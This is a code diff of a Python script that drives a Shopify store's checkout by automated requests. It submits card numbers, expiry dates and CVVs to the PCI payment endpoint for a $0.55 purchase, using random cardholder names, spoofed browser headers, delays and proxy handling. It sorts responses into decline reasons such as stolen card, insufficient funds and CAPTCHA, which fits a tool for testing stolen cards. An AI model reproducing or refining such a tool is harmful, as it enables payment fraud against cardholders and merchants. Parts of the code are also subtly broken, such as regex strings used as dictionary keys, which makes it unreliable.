+                self.proposal_id = "4abf98439cf21062e036dd8d2e449f5e15e12d9d358a82376aa630c7c8c8c81e"
+
+            if 'operationName":"SubmitForCompletion".*?"id":"([^"]+)"' in bootstrap_data:
+                self.submit_id = bootstrap_data['operationName":"SubmitForCompletion".*?"id":"([^"]+)"']
+            else:
+                self.submit_id = "d32830e07b8dcb881c73c771b679bcb141b0483bd561eced170c4feecc988a59"
+
+            self.random_delay(2, 3)
+
+            # Step 6: Submit Proposal mutation
+            self.step(6, "SUBMIT PROPOSAL", "Submitting checkout proposal", self.email)
+
+            graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
+
+            stable_id = self.generate_uuid()
+
+            # FIXED: Correct structure based on captured traffic - sessionInput is at variables level
+            proposal_variables = {
+                "sessionInput": {
+                    "sessionToken": self.graphql_session_token
                 },
-                'payment_session_scope': 'meta-app-prod-store-1.myshopify.com'
-            }
-            
-            async with httpx.AsyncClient(timeout=30.0) as pci_client:
-                response = await pci_client.post(
-                    'https://checkout.pci.shopifyinc.com/sessions',
-                    headers=headers,
-                    json=json_data,
-                    timeout=30.0
-                )
-            
-            # Check if proxy failed
-            if response is None:
-                self.console_logger.error_detail("Proxy dead or connection failed")
-                return False, "PROXY_DEAD"
-            
-            self.console_logger.request_details("POST", 'https://checkout.pci.shopifyinc.com/sessions',
-                                              response.status_code,
-                                              time.time() - (self.console_logger.start_time + elapsed),
-                                              f"Card: {cc[:6]}XXXXXX{cc[-4:]} | Cardholder: {card_name}")
-            
-            if response.status_code == 200:
-                try:
-                    data = response.json()
-                    session_id = data.get("id", "")
-                    if session_id:
-                        self.console_logger.extracted_data("Payment Session ID", f"{session_id[:30]}...")
-                        self.console_logger.step(7, "CREATE PAYMENT SESSION", "Payment session created", "SUCCESS")
-                        return True, session_id
-                    else:
-                        self.console_logger.error_detail("No session ID in response")
-                        return False, "No payment session ID"
-                except:
-                    self.console_logger.error_detail("Failed to parse payment session response")
-                    return False, "Payment session parse error"
-            else:
-                error_msg = "Payment session creation failed"
-                try:
-                    error_data = response.json()
-                    if "error" in error_data:
-                        error_msg = error_data.get("error", {}).get("message", error_msg)
-                except:
-                    pass
-                
-                error_text = response.text.lower()
-                if "declined" in error_text:
-                    error_msg = "Card Declined"
-                elif "cvc" in error_text:
-                    error_msg = "Invalid CVC"
-                elif "expired" in error_text:
-                    error_msg = "Expired Card"
-                elif "funds" in error_text:
-                    error_msg = "Insufficient Funds"
-                elif "invalid" in error_text:
-                    error_msg = "Invalid Card"
-                elif "unprocessable" in error_text:
-                    error_msg = "Card Unprocessable"
-                
-                self.console_logger.error_detail(f"Payment session failed: {response.status_code} - {error_msg}")
-                return False, error_msg
-                
-        except Exception as e:
-            self.console_logger.error_detail(f"Payment session error: {str(e)}")
-            return False, f"Payment error: {str(e)[:80]}"
-    
-    async def complete_checkout_with_payment(self, client, session_id, cc, mes, ano, cvv):
-        """Complete the checkout with CORRECT STRUCTURE - FIXED DELIVERY"""
-        try:
-            elapsed = self.console_logger.step(8, "COMPLETE CHECKOUT", "Submitting checkout with CORRECT structure")
-            
-            if not self.checkout_token or not self.x_checkout_one_session_token:
-                return False, "Missing checkout tokens"
-            
-            # Use the checkout token from the final URL
-            checkout_token_to_use = self.checkout_token
-            
-            url = f"{self.base_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion"
-            
-            headers = {
-                'Accept': 'application/json',
-                'Accept-Encoding': 'gzip, deflate, br, zstd',
-                'Accept-Language': 'en-US',
-                'Content-Type': 'application/json',
-                'Origin': self.base_url,
-                'Referer': f'{self.base_url}/checkouts/cn/{checkout_token_to_use}/en-us',
-                'Sec-CH-UA': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
-                'Sec-CH-UA-Mobile': '?0',
-                'Sec-CH-UA-Platform': '"Windows"',
-                'Sec-Fetch-Dest': 'empty',
-                'Sec-Fetch-Mode': 'cors',
-                'Sec-Fetch-Site': 'same-origin',
-                'Shopify-Checkout-Client': 'checkout-web/1.0',
-                'Shopify-Checkout-Source': f'id="{checkout_token_to_use}", type="cn"',
-                'User-Agent': self.user_agent,
-                'X-Checkout-One-Session-Token': self.x_checkout_one_session_token,
-                'X-Checkout-Web-Build-Id': self.x_checkout_web_build_id,
-                'X-Checkout-Web-Deploy-Stage': 'production',
-                'X-Checkout-Web-Server-Handling': 'fast',
-                'X-Checkout-Web-Server-Rendering': 'yes',
-                'X-Checkout-Web-Source-Id': checkout_token_to_use
-            }
-            
-            # Use the correct variant ID from product page
-            variant_id = self.variant_id if self.variant_id else "43207284392098"
-            
-            # Use random name for billing address (matches cardholder name)
-            card_name = f"{self.random_first_name} {self.random_last_name}"
-            
-            # Use ACTUAL product price extracted from page (or default 0.55)
-            actual_price = self.product_price if self.product_price else 0.55
-            price_str = f"{actual_price:.2f}"
-            
-            # Generate stable ID for merchandise lines
-            stable_id = f"stable-{random.randint(1000, 9999)}"
-            
-            # CORRECTED payload - EXACTLY MATCHING OLD WORKING SCRIPT STRUCTURE
-            # The key fix: noDeliveryRequired is an EMPTY ARRAY, not boolean or null
-            json_data = {
-                "operationName": "SubmitForCompletion",
-                "variables": {
-                    "input": {
-                        "sessionInput": {
-                            "sessionToken": self.x_checkout_one_session_token,
-                        },
-                        "queueToken": f"{self.generate_random_string(43)}==",
-                        "discounts": {
-                            "lines": [],
-                            "acceptUnexpectedDiscounts": True,
-                        },
-                        # CORRECTED DELIVERY STRUCTURE - EXACTLY LIKE OLD SCRIPT
-                        "delivery": {
-                            "deliveryLines": [{
-                                "destination": {
-                                    "geolocation": {
-                                        "coordinates": {
-                                            "latitude": 40.18073830000001,
-                                            "longitude": -75.14480139999999
-                                        },
-                                        "countryCode": "US"
-                                    }
+                "queueToken": f"{self.generate_random_string(43)}==",
+                "discounts": {
+                    "lines": [],
+                    "acceptUnexpectedDiscounts": True
+                },
+                "delivery": {
+                    "deliveryLines": [{
+                        "destination": {
+                            "geolocation": {
+                                "coordinates": {
+                                    "latitude": 40.18073830000001,
+                                    "longitude": -75.14480139999999
                                 },
-                                "selectedDeliveryStrategy": {
-                                    "deliveryStrategyByHandle": {
-                                        "handle": self.delivery_strategy_handle,
-                                        "customDeliveryRate": False
-                                    },
-                                    "options": {}
-                                },
-                                "targetMerchandiseLines": {
-                                    "lines": [{
-                                        "stableId": stable_id
-                                    }]
-                                },
-                                "deliveryMethodTypes": ["PICK_UP"],
-                                "expectedTotalPrice": {
-                                    "value": {
-                                        "amount": "0.00",
-                                        "currencyCode": "USD"
-                                    }
-                                },
-                                "destinationChanged": True
-                            }],
-                            "noDeliveryRequired": [],  # EMPTY ARRAY - EXACTLY LIKE OLD SCRIPT
-                            "useProgressiveRates": False,
-                            "prefetchShippingRatesStrategy": None,
-                            "supportsSplitShipping": True
-                        },
-                        "deliveryExpectations": {
-                            "deliveryExpectationLines": []
-                        },
-                        "merchandise": {
-                            "merchandiseLines": [{
-                                "stableId": stable_id,
-                                "merchandise": {
-                                    "productVariantReference": {
-                                        "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
-                                        "variantId": f"gid://shopify/ProductVariant/{variant_id}",
-                                        "properties": [],
-                                        "sellingPlanId": None,
-                                        "sellingPlanDigest": None
-                                    }
-                                },
-                                "quantity": {
-                                    "items": {
-                                        "value": 1
-                                    }
-                                },
-                                "expectedTotalPrice": {
-                                    "value": {
-                                        "amount": price_str,
-                                        "currencyCode": "USD"
-                                    }
-                                },
-                                "lineComponentsSource": None,
-                                "lineComponents": []
-                            }]
-                        },
-                        "memberships": {
-                            "memberships": []
-                        },
-                        "payment": {
-                            "totalAmount": {"any": True},
-                            "paymentLines": [{
-                                "paymentMethod": {
-                                    "directPaymentMethod": {
-                                        "paymentMethodIdentifier": "shopify_payments",
-                                        "sessionId": session_id,
-                                        "billingAddress": {
-                                            "streetAddress": {
-                                                "address1": self.billing_address["address1"],
-                                                "address2": self.billing_address["address2"],
-                                                "city": self.billing_address["city"],
-                                                "countryCode": self.billing_address["country"],
-                                                "postalCode": self.billing_address["zip"],
-                                                "firstName": self.billing_address["first_name"],
-                                                "lastName": self.billing_address["last_name"],
-                                                "zoneCode": self.billing_address["province"],
-                                                "phone": self.billing_address["phone"]
-                                            }
-                                        },
-                                        "cardSource": None
-                                    },
-                                    "giftCardPaymentMethod": None,
-                                    "redeemablePaymentMethod": None,
-                                    "walletPaymentMethod": None,
-                                    "walletsPlatformPaymentMethod": None,
-                                    "localPaymentMethod": None,
-                                    "paymentOnDeliveryMethod": None,
-                                    "paymentOnDeliveryMethod2": None,
-                                    "manualPaymentMethod": None,
-                                    "customPaymentMethod": None,
-                                    "offsitePaymentMethod": None,
-                                    "customOnsitePaymentMethod": None,
-                                    "deferredPaymentMethod": None,
-                                    "customerCreditCardPaymentMethod": None,
-                                    "paypalBillingAgreementPaymentMethod": None,
-                                    "remotePaymentInstrument": None
-                                },
-                                "amount": {
-                                    "value": {
-                                        "amount": price_str,
-                                        "currencyCode": "USD"
-                                    }
-                                }
-                            }],
-                            "billingAddress": {
-                                "streetAddress": {
-                                    "address1": self.billing_address["address1"],
-                                    "address2": self.billing_address["address2"],
-                                    "city": self.billing_address["city"],
-                                    "countryCode": self.billing_address["country"],
-                                    "postalCode": self.billing_address["zip"],
-                                    "firstName": self.billing_address["first_name"],
-                                    "lastName": self.billing_address["last_name"],
-                                    "zoneCode": self.billing_address["province"],
-                                    "phone": self.billing_address["phone"]
-                                }
+                                "countryCode": "US"
                             }
                         },
-                        "buyerIdentity": {
-                            "customer": {
-                                "presentmentCurrency": "USD",
-                                "countryCode": "US"
+                        "selectedDeliveryStrategy": {
+                            "deliveryStrategyByHandle": {
+                                "handle": self.delivery_strategy_handle,
+                                "customDeliveryRate": False
                             },
-                            "email": self.shipping_address["email"],
-                            "emailChanged": False,
-                            "phoneCountryCode": "US",
-                            "marketingConsent": [],
-                            "shopPayOptInPhone": {
-                                "countryCode": "US"
+                            "options": {}
+                        },
+                        "targetMerchandiseLines": {
+                            "lines": [{
+                                "stableId": stable_id
+                            }]
+                        },
+                        "deliveryMethodTypes": ["PICK_UP"],
+                        "expectedTotalPrice": {
+                            "value": {
+                                "amount": "0.00",
+                                "currencyCode": "USD"
+                            }
+                        },
+                        "destinationChanged": True
+                    }],
+                    "noDeliveryRequired": [],
+                    "useProgressiveRates": False,
+                    "prefetchShippingRatesStrategy": None,
+                    "supportsSplitShipping": True
+                },
+                "deliveryExpectations": {
+                    "deliveryExpectationLines": []
+                },
+                "merchandise": {
+                    "merchandiseLines": [{
+                        "stableId": stable_id,
+                        "merchandise": {
+                            "productVariantReference": {
+                                "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
+                                "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
+                                "properties": [],
+                                "sellingPlanId": None,
+                                "sellingPlanDigest": None
+                            }
+                        },
+                        "quantity": {
+                            "items": {
+                                "value": 1
+                            }
+                        },
+                        "expectedTotalPrice": {
+                            "value": {
+                                "amount": "0.55",
+                                "currencyCode": "USD"
+                            }
+                        },
+                        "lineComponentsSource": None,
+                        "lineComponents": []
+                    }]
+                },
+                "memberships": {
+                    "memberships": []
+                },
+                "payment": {
+                    "totalAmount": {"any": True},
+                    "paymentLines": [],
+                    "billingAddress": {
+                        "streetAddress": {
+                            "address1": "8 Log Pond Drive",
+                            "address2": "",
+                            "city": "Horsham",
+                            "countryCode": "US",
+                            "postalCode": "19044",
+                            "firstName": self.first_name,
+                            "lastName": self.last_name,
+                            "zoneCode": "PA",
+                            "phone": ""
+                        }
+                    }
+                },
+                "buyerIdentity": {
+                    "customer": {
+                        "presentmentCurrency": "USD",
+                        "countryCode": "US"
+                    },
+                    "email": self.email,
+                    "emailChanged": False,
+                    "phoneCountryCode": "US",
+                    "marketingConsent": [],
+                    "shopPayOptInPhone": {
+                        "countryCode": "US"
+                    },
+                    "rememberMe": False
+                },
+                "tip": {
+                    "tipLines": []
+                },
+                "taxes": {
+                    "proposedAllocations": None,
+                    "proposedTotalAmount": {
+                        "value": {
+                            "amount": "0.03",
+                            "currencyCode": "USD"
+                        }
+                    },
+                    "proposedTotalIncludedAmount": None,
+                    "proposedMixedStateTotalAmount": None,
+                    "proposedExemptions": []
+                },
+                "note": {
+                    "message": None,
+                    "customAttributes": []
+                },
+                "localizationExtension": {
+                    "fields": []
+                },
+                "nonNegotiableTerms": None,
+                "scriptFingerprint": {
+                    "signature": None,
+                    "signatureUuid": None,
+                    "lineItemScriptChanges": [],
+                    "paymentScriptChanges": [],
+                    "shippingScriptChanges": []
+                },
+                "optionalDuties": {
+                    "buyerRefusesDuties": False
+                },
+                "cartMetafields": []
+            }
+
+            proposal_headers = {
+                'authority': 'meta-app-prod-store-1.myshopify.com',
+                'accept': 'application/json',
+                'accept-language': 'en-US',
+                'content-type': 'application/json',
+                'origin': self.base_url,
+                'referer': f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us/",
+                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'shopify-checkout-client': 'checkout-web/1.0',
+                'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
+                'x-checkout-one-session-token': self.session_token,
+                'x-checkout-web-build-id': '0e1aa4a2d0226841954371a4b7b45388eaac3ef4',
+                'x-checkout-web-deploy-stage': 'production',
+                'x-checkout-web-server-handling': 'fast',
+                'x-checkout-web-server-rendering': 'yes',
+                'x-checkout-web-source-id': self.checkout_token
+            }
+
+            proposal_payload = {
+                "operationName": "Proposal",
+                "variables": proposal_variables,
+                "id": self.proposal_id
+            }
+
+            self.logger.data_extracted("Proposal Variables", json.dumps(proposal_variables, indent=2)[:200] + "...", "Constructed")
+
+            resp = self.session.post(
+                graphql_url,
+                headers=proposal_headers,
+                json=proposal_payload,
+                timeout=30
+            )
+
+            if resp.status_code != 200:
+                return False, f"Proposal failed: {resp.status_code}"
+
+            try:
+                proposal_resp = resp.json()
+                if 'errors' in proposal_resp and proposal_resp['errors']:
+                    error_msg = proposal_resp['errors'][0].get('message', 'Unknown error')
+                    return False, f"Proposal error: {error_msg}"
+            except Exception as e:
+                return False, f"Failed to parse Proposal response: {str(e)}"
+
+            self.random_delay(1, 2)
+
+            # Step 7: Create payment session with PCI
+            self.step(7, "CREATE PAYMENT", "Creating payment session with PCI")
+
+            pci_headers = {
+                'authority': 'checkout.pci.shopifyinc.com',
+                'accept': 'application/json',
+                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+                'content-type': 'application/json',
+                'origin': 'https://checkout.pci.shopifyinc.com',
+                'referer': 'https://checkout.pci.shopifyinc.com/build/682c31f/number-ltr.html',
+                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-storage-access': 'active',
+                'shopify-identification-signature': f'eyJraWQiOiJ2MSIsImFsZyI6IkhTMjU2In0.{self.generate_random_string(100)}.{self.generate_random_string(43)}',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36'
+            }
+
+            card_number = cc.replace(" ", "").replace("-", "")
+            year_full = ano if len(ano) == 4 else f"20{ano}"
+            month_int = int(mes)
+
+            pci_payload = {
+                "credit_card": {
+                    "number": card_number,
+                    "month": month_int,
+                    "year": int(year_full),
+                    "verification_value": cvv,
+                    "name": self.full_name,
+                    "start_month": None,
+                    "start_year": None,
+                    "issue_number": ""
+                },
+                "payment_session_scope": "meta-app-prod-store-1.myshopify.com"
+            }
+
+            resp = self.session.post(
+                'https://checkout.pci.shopifyinc.com/sessions',
+                headers=pci_headers,
+                json=pci_payload,
+                timeout=30
+            )
+
+            if resp.status_code != 200:
+                return False, f"PCI session creation failed: {resp.status_code}"
+
+            try:
+                pci_resp = resp.json()
+                payment_session_id = pci_resp.get('id')
+                payment_method_identifier = pci_resp.get('payment_method_identifier')
+                if not payment_session_id:
+                    return False, "No payment session ID returned"
+                self.logger.data_extracted("Payment Session ID", payment_session_id, "PCI")
+            except Exception as e:
+                return False, f"Failed to parse PCI response: {str(e)}"
+
+            self.random_delay(1, 2)
+
+            # Step 8: Submit for completion
+            self.step(8, "SUBMIT PAYMENT", "Submitting payment for processing")
+
+            # FIXED: Generate attemptToken in correct format: checkout_token-randomstring
+            attempt_token = f"{self.checkout_token}-{self.generate_random_string(12)}"
+
+            # FIXED: Correct structure based on working request
+            # sessionInput is inside input object
+            # attemptToken, analytics, metafields are at variables level, not inside input
+            submit_variables = {
+                "input": {
+                    "sessionInput": {
+                        "sessionToken": self.graphql_session_token
+                    },
+                    "queueToken": f"{self.generate_random_string(43)}==",
+                    "discounts": {
+                        "lines": [],
+                        "acceptUnexpectedDiscounts": True
+                    },
+                    "delivery": {
+                        "deliveryLines": [{
+                            "destination": {
+                                "geolocation": {
+                                    "coordinates": {
+                                        "latitude": 40.18073830000001,
+                                        "longitude": -75.14480139999999
+                                    },
+                                    "countryCode": "US"
+                                }
                             },
-                            "rememberMe": False
-                        },
-                        "tip": {
-                            "tipLines": []
-                        },
-                        "taxes": {
-                            "proposedAllocations": None,
-                            "proposedTotalAmount": {
+                            "selectedDeliveryStrategy": {
+                                "deliveryStrategyByHandle": {
+                                    "handle": self.delivery_strategy_handle,
+                                    "customDeliveryRate": False
+                                },
+                                "options": {}
+                            },
+                            "targetMerchandiseLines": {
+                                "lines": [{
+                                    "stableId": stable_id
+                                }]
+                            },
+                            "deliveryMethodTypes": ["PICK_UP"],
+                            "expectedTotalPrice": {
                                 "value": {
-                                    "amount": "0.03",
+                                    "amount": "0.00",
                                     "currencyCode": "USD"
                                 }
                             },
-                            "proposedTotalIncludedAmount": None,
-                            "proposedMixedStateTotalAmount": None,
-                            "proposedExemptions": []
-                        },
-                        "note": {
-                            "message": None,
-                            "customAttributes": []
-                        },
-                        "localizationExtension": {
-                            "fields": []
-                        },
-                        "nonNegotiableTerms": None,
-                        "scriptFingerprint": {
-                            "signature": None,
-                            "signatureUuid": None,
-                            "lineItemScriptChanges": [],
-                            "paymentScriptChanges": [],
-                            "shippingScriptChanges": []
-                        },
-                        "optionalDuties": {
-                            "buyerRefusesDuties": False
-                        },
-                        "cartMetafields": []
+                            "destinationChanged": True
+                        }],
+                        "noDeliveryRequired": [],
+                        "useProgressiveRates": False,
+                        "prefetchShippingRatesStrategy": None,
+                        "supportsSplitShipping": True
                     },
-                    "attemptToken": f"{checkout_token_to_use}-{random.randint(1000, 9999)}",
-                    "metafields": [],
-                    "analytics": {
-                        "requestUrl": f"https://meta-app-prod-store-1.myshopify.com/checkouts/cn/{checkout_token_to_use}/en-us?_r={self.generate_random_string(32)}",
-                        "pageId": f"{self.generate_random_string(8)}-{self.generate_random_string(4)}-{self.generate_random_string(4)}-{self.generate_random_string(4)}-{self.generate_random_string(12)}"
-                    }
-                },
-                "id": "d32830e07b8dcb881c73c771b679bcb141b0483bd561eced170c4feecc988a59"
-            }
-            
-            # DEBUG: Print the JSON data for troubleshooting
-            self.console_logger.sub_step(8, 1, f"Submitting checkout with token: {checkout_token_to_use}")
-            self.console_logger.sub_step(8, 2, f"Session token: {self.x_checkout_one_session_token[:50]}...")
-            self.console_logger.sub_step(8, 3, f"Payment session: {session_id[:30]}...")
-            self.console_logger.sub_step(8, 4, f"Variant ID: {variant_id}")
-            self.console_logger.sub_step(8, 5, f"Email: {self.shipping_address['email']}")
-            self.console_logger.sub_step(8, 6, f"Billing name: {card_name}")
-            self.console_logger.sub_step(8, 7, f"Using ACTUAL price: ${actual_price:.2f}")
-            self.console_logger.sub_step(8, 8, f"Address: {self.billing_address['address1']}, {self.billing_address['city']}")
-            self.console_logger.sub_step(8, 9, f"Delivery: FULL STRUCTURE with PICK_UP")
-            self.console_logger.sub_step(8, 10, f"Payload size: {len(json.dumps(json_data))} bytes")
-            
-            response = await client.post(
-                url,
-                headers=headers,
-                json=json_data,
-                cookies=self.cookies,
-                timeout=30.0
-            )
-            
-            # Check if proxy failed
-            if response is None:
-                self.console_logger.error_detail("Proxy dead or connection failed")
-                return False, "PROXY_DEAD"
-            
-            self.console_logger.request_details("POST", url, response.status_code,
-                                              time.time() - (self.console_logger.start_time + elapsed),
-                                              "Complete checkout with CORRECT structure")
-            
-            # DEBUG: Log response details
-            self.console_logger.sub_step(8, 11, f"Response status: {response.status_code}")
-            
-            if response.status_code == 200:
-                try:
-                    data = response.json()
-                    self.console_logger.sub_step(8, 12, f"Response parsed successfully")
-                    return self.parse_payment_response(data)
-                except Exception as e:
-                    self.console_logger.error_detail(f"Failed to parse checkout response: {str(e)}")
-                    # Try to get error from response text
-                    error_text = response.text[:500] if response.text else "No response text"
-                    self.console_logger.sub_step(8, 13, f"Raw response: {error_text}")
-                    return False, f"Checkout parse error: {error_text}"
-            elif response.status_code == 400:
-                # Try to get more detailed error
-                try:
-                    error_data = response.json()
-                    self.console_logger.sub_step(8, 14, f"Error response JSON: {json.dumps(error_data)[:300]}...")
-                    
-                    error_msg = "Bad Request"
-                    if isinstance(error_data, dict):
-                        if 'errors' in error_data:
-                            errors = error_data['errors']
-                            if isinstance(errors, list) and len(errors) > 0:
-                                if isinstance(errors[0], dict):
-                                    error_msg = errors[0].get('message', str(errors[0]))
-                                else:
-                                    error_msg = str(errors[0])
-                            elif isinstance(errors, str):
-                                error_msg = errors
-                        else:
-                            error_msg = str(error_data)
-                    elif isinstance(error_data, str):
-                        error_msg = error_data
-                    
-                except Exception as e:
-                    error_msg = response.text[:200] if response.text else "Bad Request"
-                    self.console_logger.sub_step(8, 15, f"Error parsing error response: {str(e)}")
-                
-                self.console_logger.error_detail(f"Checkout failed: 400 - {error_msg}")
-                return False, f"Checkout failed: {error_msg}"
-            else:
-                error_text = response.text[:500] if response.text else "No response"
-                self.console_logger.sub_step(8, 16, f"Full error response: {error_text}")
-                self.console_logger.error_detail(f"Checkout failed: {response.status_code} - {error_text}")
-                return False, f"Checkout failed: HTTP {response.status_code}"
-                
-        except Exception as e:
-            self.console_logger.error_detail(f"Checkout completion error: {str(e)}")
-            return False, f"Checkout error: {str(e)[:80]}"
-    
-    def parse_payment_response(self, data):
-        """Parse payment response - FIXED TO EXTRACT REAL ERROR MESSAGES"""
-        try:
-            if not isinstance(data, dict):
-                return False, "Invalid response format"
-            
-            # DEBUG: Log the full response for analysis
-            response_str = json.dumps(data, indent=2)
-            self.console_logger.sub_step(8, 17, f"Full response: {response_str[:500]}...")
-            
-            # Check for GraphQL errors in the response
-            if 'errors' in data:
-                errors = data['errors']
-                if isinstance(errors, list) and errors:
-                    # Get the first error
-                    error_data = errors[0]
-                    if isinstance(error_data, dict):
-                        error_msg = error_data.get('message', 'Payment failed')
-                        
-                        # Try to extract more specific error from extensions
-                        extensions = error_data.get('extensions', {})
-                        if 'code' in extensions:
-                            error_code = extensions['code']
-                            # Map Shopify error codes to human-readable messages
-                            error_map = {
-                                'INSUFFICIENT_FUNDS': 'Insufficient Funds',
-                                'INVALID_CVC': 'Invalid CVC',
-                                'EXPIRED_CARD': 'Expired Card',
-                                'INCORRECT_CVC': 'Incorrect CVC',
-                                'CARD_DECLINED': 'Card Declined',
-                                'PROCESSING_ERROR': 'Processing Error',
-                                'INCORRECT_NUMBER': 'Incorrect Card Number',
-                                'INVALID_NUMBER': 'Invalid Card Number',
-                                'INVALID_EXPIRY_DATE': 'Invalid Expiry Date',
-                                'INCORRECT_ZIP': 'Incorrect ZIP Code',
-                                'ADDRESS_VERIFICATION_FAILED': 'Address Verification Failed',
-                                'CVV_FAILURE': 'CVV Verification Failed',
-                                'DO_NOT_HONOR': 'Do Not Honor',
-                                'PICKUP_CARD': 'Pickup Card',
-                                'LOST_CARD': 'Lost Card',
-                                'STOLEN_CARD': 'Stolen Card',
-                                'RESTRICTED_CARD': 'Restricted Card',
-                                'CALL_ISSUER': 'Call Issuer',
-                                'DECLINED': 'Card Declined',
-                                'GENERIC_DECLINE': 'Card Declined',
-                                'HARD_DECLINE': 'Card Declined',
-                                'SOFT_DECLINE': 'Card Declined',
-                                'FRAUD': 'Suspected Fraud',
-                                'BLACKLISTED': 'Card Blacklisted',
-                                'VELOCITY_EXCEEDED': 'Transaction Limit Exceeded',
-                                'THREE_D_SECURE_REQUIRED': '3D Secure Required',
-                                'CAPTCHA_REQUIRED': 'CAPTCHA Required',
-                                'RATE_LIMITED': 'Rate Limited',
-                                'UNAUTHORIZED': 'Unauthorized Transaction',
+                    "deliveryExpectations": {
+                        "deliveryExpectationLines": []
+                    },
+                    "merchandise": {
+                        "merchandiseLines": [{
+                            "stableId": stable_id,
+                            "merchandise": {
+                                "productVariantReference": {
+                                    "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
+                                    "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
+                                    "properties": [],
+                                    "sellingPlanId": None,
+                                    "sellingPlanDigest": None
+                                }
+                            },
+                            "quantity": {
+                                "items": {
+                                    "value": 1
+                                }
+                            },
+                            "expectedTotalPrice": {
+                                "value": {
+                                    "amount": "0.55",
+                                    "currencyCode": "USD"
+                                }
+                            },
+                            "lineComponentsSource": None,
+                            "lineComponents": []
+                        }]
+                    },
+                    "memberships": {
+                        "memberships": []
+                    },
+                    "payment": {
+                        "totalAmount": {"any": True},
+                        "paymentLines": [{
+                            "paymentMethod": {
+                                "directPaymentMethod": {
+                                    "paymentMethodIdentifier": payment_method_identifier if 'payment_method_identifier' in locals() else "",
+                                    "sessionId": payment_session_id,
+                                    "billingAddress": {
+                                        "streetAddress": {
+                                            "address1": "8 Log Pond Drive",
+                                            "address2": "",
+                                            "city": "Horsham",
+                                            "countryCode": "US",
+                                            "postalCode": "19044",
+                                            "firstName": self.first_name,
+                                            "lastName": self.last_name,
+                                            "zoneCode": "PA",
+                                            "phone": ""
+                                        }
+                                    },
+                                    "cardSource": None
+                                },
+                                "giftCardPaymentMethod": None,
+                                "redeemablePaymentMethod": None,
+                                "walletPaymentMethod": None,
+                                "walletsPlatformPaymentMethod": None,
+                                "localPaymentMethod": None,
+                                "paymentOnDeliveryMethod": None,
+                                "paymentOnDeliveryMethod2": None,
+                                "manualPaymentMethod": None,
+                                "customPaymentMethod": None,
+                                "offsitePaymentMethod": None,
+                                "customOnsitePaymentMethod": None,
+                                "deferredPaymentMethod": None,
+                                "customerCreditCardPaymentMethod": None,
+                                "paypalBillingAgreementPaymentMethod": None,
+                                "remotePaymentInstrument": None
+                            },
+                            "amount": {
+                                "value": {
+                                    "amount": "0.58",
+                                    "currencyCode": "USD"
+                                }
                             }
-                            if error_code in error_map:
-                                error_msg = error_map[error_code]
-                        
-                        # Check for CAPTCHA specifically
-                        if 'captcha' in error_msg.lower() or 'robot' in error_msg.lower() or 'human' in error_msg.lower():
-                            return False, "CAPTCHA_REQUIRED"
-                        
-                        return False, error_msg
-                    else:
-                        return False, str(error_data)
-                elif isinstance(errors, str):
-                    error_msg = errors
-                    if 'captcha' in error_msg.lower():
-                        return False, "CAPTCHA_REQUIRED"
-                    return False, error_msg
+                        }],
+                        "billingAddress": {
+                            "streetAddress": {
+                                "address1": "8 Log Pond Drive",
+                                "address2": "",
+                                "city": "Horsham",
+                                "countryCode": "US",
+                                "postalCode": "19044",
+                                "firstName": self.first_name,
+                                "lastName": self.last_name,
+                                "zoneCode": "PA",
+                                "phone": ""
+                            }
+                        }
+                    },
+                    "buyerIdentity": {
+                        "customer": {
+                            "presentmentCurrency": "USD",
+                            "countryCode": "US"
+                        },
+                        "email": self.email,
+                        "emailChanged": False,
+                        "phoneCountryCode": "US",
+                        "marketingConsent": [],
+                        "shopPayOptInPhone": {
+                            "countryCode": "US"
+                        },
+                        "rememberMe": False
+                    },
+                    "tip": {
+                        "tipLines": []
+                    },
+                    "taxes": {
+                        "proposedAllocations": None,
+                        "proposedTotalAmount": {
+                            "value": {
+                                "amount": "0.03",
+                                "currencyCode": "USD"
+                            }
+                        },
+                        "proposedTotalIncludedAmount": None,
+                        "proposedMixedStateTotalAmount": None,
+                        "proposedExemptions": []
+                    },
+                    "note": {
+                        "message": None,
+                        "customAttributes": []
+                    },
+                    "localizationExtension": {
+                        "fields": []
+                    },
+                    "nonNegotiableTerms": None,
+                    "scriptFingerprint": {
+                        "signature": None,
+                        "signatureUuid": None,
+                        "lineItemScriptChanges": [],
+                        "paymentScriptChanges": [],
+                        "shippingScriptChanges": []
+                    },
+                    "optionalDuties": {
+                        "buyerRefusesDuties": False
+                    },
+                    "cartMetafields": []
+                },
+                # FIXED: These are at variables level, not inside input
+                "attemptToken": attempt_token,
+                "metafields": [],
+                "analytics": {
+                    "requestUrl": f"https://meta-app-prod-store-1.myshopify.com/checkouts/cn/{self.checkout_token}/en-us/?_r={self.generate_random_string(32)}",
+                    "pageId": f"{self.generate_random_string(8)}-{self.generate_random_string(4)}-{self.generate_random_string(4)}-{self.generate_random_string(4)}-{self.generate_random_string(12)}"
+                }
+            }
+
+            submit_payload = {
+                "operationName": "SubmitForCompletion",
+                "variables": submit_variables,
+                "id": self.submit_id
+            }
+
+            self.logger.data_extracted("Submit Variables", json.dumps(submit_variables, indent=2)[:200] + "...", "Constructed")
+
